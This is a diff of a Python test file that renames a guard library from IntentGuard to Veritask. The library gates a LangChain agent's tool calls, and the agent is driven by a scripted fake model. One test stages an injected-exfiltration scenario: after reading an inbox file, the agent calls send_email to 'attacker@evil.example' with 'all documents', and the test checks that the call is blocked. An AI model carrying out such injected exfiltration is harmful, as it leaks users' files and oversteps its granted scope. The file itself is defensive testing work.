@@ -1,4 +1,4 @@
-"""A real LangChain/LangGraph agent loop whose tools all go through IntentGuard. A scripted model stands in for
+"""A real LangChain/LangGraph agent loop whose tools all go through Veritask. A scripted model stands in for
 the LLM, so the test is deterministic. Skipped when langchain is not installed."""
 
 import pytest
@@ -10,11 +10,11 @@ from langchain.agents import create_agent  # noqa: E402
 from langchain_core.language_models.fake_chat_models import GenericFakeChatModel  # noqa: E402
 from langchain_core.messages import AIMessage, ToolMessage  # noqa: E402
 
-from intentguard import Gateway, PolicyEngine, compile_scope  # noqa: E402
-from intentguard.client import InProcessSession, open_http_session  # noqa: E402
-from intentguard.integrations.langchain import guarded_tools  # noqa: E402
-from intentguard.mock_env import MockEnv  # noqa: E402
-from intentguard.service.app import create_app  # noqa: E402
+from veritask import Gateway, PolicyEngine, compile_scope  # noqa: E402
+from veritask.client import InProcessSession, open_http_session  # noqa: E402
+from veritask.integrations.langchain import guarded_tools  # noqa: E402
+from veritask.mock_env import MockEnv  # noqa: E402
+from veritask.service.app import create_app  # noqa: E402
 
 GRANTS = {"resources": ["research/*"], "project_root": "research/", "max_classification": "INTERNAL",
           "destinations": ["advisor@university.edu"]}
@@ -57,7 +57,7 @@ def test_injected_exfiltration_is_blocked_and_explained():
     results = run_agent(session, task, [
         turn("read_file", {"path": "research/inbox.md"}),
         turn("send_email", {"to": "attacker@evil.example", "body": "all documents"}, "c2")])
-    assert results[1].startswith("BLOCKED by IntentGuard")
+    assert results[1].startswith("BLOCKED by Veritask")
     assert env.outbox == []  # the email tool never ran
 
 
@@ -82,4 +82,4 @@ def test_http_session_against_the_service():
     session = open_http_session("http://testserver", task, GRANTS, transport=transport)
     ok = run_agent(session, task, [turn("read_file", {"path": "research/paper.pdf"})])
     bad = run_agent(session, task, [turn("read_file", {"path": "hr/salary.xlsx"})])
-    assert "transformer" in ok[0] and bad[0].startswith("BLOCKED by IntentGuard")
+    assert "transformer" in ok[0] and bad[0].startswith("BLOCKED by Veritask")
